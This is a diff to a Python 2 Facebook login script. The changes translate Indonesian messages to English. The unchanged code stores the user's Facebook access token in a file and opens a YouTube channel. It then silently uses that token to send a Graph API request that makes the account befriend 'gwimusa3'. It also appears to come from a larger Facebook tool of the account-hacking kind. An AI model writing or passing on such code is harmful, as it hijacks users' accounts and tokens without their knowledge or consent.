@@ -118,7 +118,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mYpur account is not eligible for this purpose"
+			print"\n\033[1;96m[!] \x1b[1;91mYour account is not responding perfectly..."
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -140,20 +140,20 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successfuly'
 				os.system('xdg-open https://youtube.com/channel/UCkoqlUeR59-foCsaMdQJOJw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+				print"\n\033[1;96m[!] \x1b[1;91mYour account is not responding perfectly..."
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
+			print("\n\033[1;96m[!] \x1b[1;91mIt looks like your account has been disabled...")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
+			print("\n\033[1;96m[!] \x1b[1;91mPassword or Email is incorrect")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
